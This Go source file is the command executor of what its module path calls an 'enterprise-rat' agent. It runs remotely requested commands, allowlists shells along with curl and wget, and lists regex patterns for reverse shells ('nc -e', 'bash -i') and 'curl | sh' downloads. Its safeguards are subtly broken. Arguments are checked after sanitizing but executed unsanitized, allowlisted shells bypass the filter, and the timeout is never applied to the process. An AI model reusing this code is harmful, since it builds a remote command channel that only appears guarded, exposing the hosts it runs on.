package executor

import (
	"bytes"
	"context"
	"fmt"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/enterprise-rat/agent/internal/models"
)

var allowedCommands = map[string]bool{
	"powershell.exe": true,
	"powershell":     true,
	"cmd.exe":        true,
	"cmd":            true,
	"python":         true,
	"python3":        true,
	"python2":        true,
	"bash":           true,
	"sh":             true,
	"zsh":            true,
	"pwsh":           true,
	"echo":           true,
	"dir":            true,
	"ls":             true,
	"cat":            true,
	"type":           true,
	"whoami":         true,
	"hostname":       true,
	"systeminfo":     true,
	"ipconfig":       true,
	"ifconfig":       true,
	"netstat":        true,
	"ps":             true,
	"tasklist":       true,
	"pwd":            true,
	"cd":             true,
	"curl":           true,
	"wget":           true,
}

var dangerousPatterns = []*regexp.Regexp{
	regexp.MustCompile(`(?i)(rm\s+-rf\s+/|mkfs|format\s+\w+:|del\s+/[sqf]\s+|Remove-Item\s+-Recurse\s+-Force)`),
	regexp.MustCompile(`(?i)(wget|curl)\s+http.*\|.*(sh|bash|python)`),
	regexp.MustCompile(`(?i)(eval|exec)\s*\(`),
	regexp.MustCompile(`(?i)(nc\s+-e|bash\s+-i|sh\s+-i)`),
	regexp.MustCompile(`(?i)(>/dev/|</dev/|2>&1).*\(base64|nc\s)`),
}

func ExecuteCommand(req *models.CommandRequest) *models.CommandResponse {
	resp := &models.CommandResponse{
		CommandID: req.CommandID,
	}

	if req.TimeoutSeconds <= 0 {
		req.TimeoutSeconds = 300
	}

	if req.TimeoutSeconds > 3600 {
		req.TimeoutSeconds = 3600
	}

	executable := sanitizePath(req.Executable)
	if !isCommandAllowed(executable) {
		resp.ExitCode = -1
		resp.ErrorMsg = "command not allowed"
		resp.StdErr = fmt.Sprintf("executable '%s' is not in the allowed list", executable)
		return resp
	}

	for _, arg := range req.Args {
		sanitizedArg := sanitizePath(arg)
		if containsDangerousPattern(sanitizedArg) {
			resp.ExitCode = -1
			resp.ErrorMsg = "command contains potentially dangerous pattern"
			return resp
		}
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(req.TimeoutSeconds)*time.Second)
	defer cancel()

	var stdout, stderr bytes.Buffer

	cmd := exec.Command(executable, req.Args...)
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()

	resp.StdOut = strings.TrimSpace(stdout.String())
	resp.StdErr = strings.TrimSpace(stderr.String())

	if ctx.Err() == context.DeadlineExceeded {
		resp.ExitCode = -1
		resp.ErrorMsg = "command timed out"
		return resp
	}

	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			resp.ExitCode = exitErr.ExitCode()
		} else {
			resp.ExitCode = -1
			resp.ErrorMsg = fmt.Sprintf("execution error: %v", err)
		}
	}

	return resp
}

func sanitizePath(path string) string {
	path = strings.TrimSpace(path)
	path = filepath.Clean(path)
	path = strings.ReplaceAll(path, ";", "")
	path = strings.ReplaceAll(path, "|", "")
	path = strings.ReplaceAll(path, "&", "")
	path = strings.ReplaceAll(path, "$", "")
	path = strings.ReplaceAll(path, "`", "")
	path = strings.ReplaceAll(path, "\n", "")
	path = strings.ReplaceAll(path, "\r", "")
	return path
}

func isCommandAllowed(executable string) bool {
	execName := strings.ToLower(filepath.Base(executable))
	return allowedCommands[execName]
}

func containsDangerousPattern(input string) bool {
	for _, pattern := range dangerousPatterns {
		if pattern.MatchString(input) {
			return true
		}
	}
	return false
}
